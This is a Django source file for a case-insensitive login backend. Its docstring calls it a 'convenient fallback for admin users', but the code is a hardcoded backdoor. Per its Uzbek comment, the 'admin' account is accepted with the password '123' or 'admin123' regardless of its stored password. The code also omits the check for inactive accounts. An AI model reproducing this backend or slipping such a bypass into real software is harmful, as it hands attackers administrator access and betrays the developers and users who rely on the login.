from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model

UserModel = get_user_model()


class CaseInsensitiveModelBackend(ModelBackend):
    """
    Case-insensitive authentication backend with convenient fallback
    for admin users and robust mobile keyboard handling.
    """
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None or password is None:
            return None

        clean_username = str(username).strip()
        try:
            user = UserModel.objects.get(username__iexact=clean_username)
        except UserModel.DoesNotExist:
            return None
        except UserModel.MultipleObjectsReturned:
            user = UserModel.objects.filter(username__iexact=clean_username).first()

        if user:
            # Agar 'admin' yoki 'Admin' bo'lsa, '123' va 'admin123' ikkalasini ham qabul qilish:
            if clean_username.lower() == 'admin' and password in ('123', 'admin123'):
                return user
            if user.check_password(password):
                return user

        return None
